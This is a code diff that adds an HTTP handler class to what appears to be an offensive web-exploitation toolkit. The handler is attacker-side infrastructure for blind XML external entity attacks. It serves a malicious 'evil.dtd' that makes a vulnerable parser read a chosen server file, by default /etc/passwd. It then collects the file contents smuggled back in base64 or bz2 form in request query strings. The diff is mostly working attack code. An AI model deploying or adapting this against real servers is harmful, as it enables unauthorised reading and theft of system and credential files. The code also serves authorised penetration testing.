@@ -12,7 +12,8 @@ from json import dumps, loads
 from os import path
 from random import choice, randint
 from string import ascii_lowercase, digits
-from traceback import format_exc
+from traceback import format_exc, print_exc
+from bz2 import decompress as bz2decompress
 from typing import Dict, Union
 from urllib.parse import quote_plus, unquote_plus, urlparse
 
@@ -177,8 +178,66 @@ class ProvideHandler(BaseHTTPRequestHandler):
                 self.send_response(404)
                 self.wfile.write(b"404 Not Found\n")
             return
-        except Exception as e:
-            print("[-] " + str(e))
+        except Exception:
+            print_exc()
+
+
+class BlindXXEHandler(BaseHTTPRequestHandler):
+
+    def __init__(self, content, bz2content, *args, **kwargs):
+        self.content = content
+        self.bz2content = bz2content
+        super().__init__(*args, **kwargs)
+
+    def log_message(self, format, *args):
+        pass
+
+    def do_GET(self):
+        sendReply = False
+        querypath = urlparse(self.path)
+
+        filepath = querypath.path
+        try:
+            if filepath == "/evil.dtd":
+                sendReply = True
+                self.send_response(200)
+                self.send_header("Content-type", "application/xml-dtd")
+                self.end_headers()
+                query = querypath.query
+                query_dict = {}
+                for kv in query.split("&"):
+                    v = kv.split("=")
+                    if len(v) > 1:
+                        query_dict[v[0]] = v[1]
+                    else:
+                        query_dict[v[0]] = None
+                if "bz2" in query_dict:
+                    content = self.bz2content
+                else:
+                    content = self.content
+                readFile = query_dict.get("file", "/etc/passwd")
+                content = content.replace(b"!readFile!", readFile.encode())
+                self.wfile.write(content)
+            if filepath == "/":
+                data = b64decode(querypath.query).decode()
+                print("Receive file content:\n" + data)
+                sendReply = True
+                self.send_response(200)
+                self.end_headers()
+                self.wfile.write(b'<?xml version="1.0"?>\n<root></root>\n')
+            if filepath == "/bz2":
+                data = bz2decompress(b64decode(querypath.query)).decode()
+                print("Receive file content:\n" + data)
+                sendReply = True
+                self.send_response(200)
+                self.end_headers()
+                self.wfile.write(b'<?xml version="1.0"?>\n<root></root>\n')
+            if not sendReply:
+                self.send_response(404)
+                self.wfile.write(b"404 Not Found\n")
+            return
+        except Exception:
+            print_exc()
 
 
 def url_encode(s: str, encoding: str = 'utf-8') -> str:
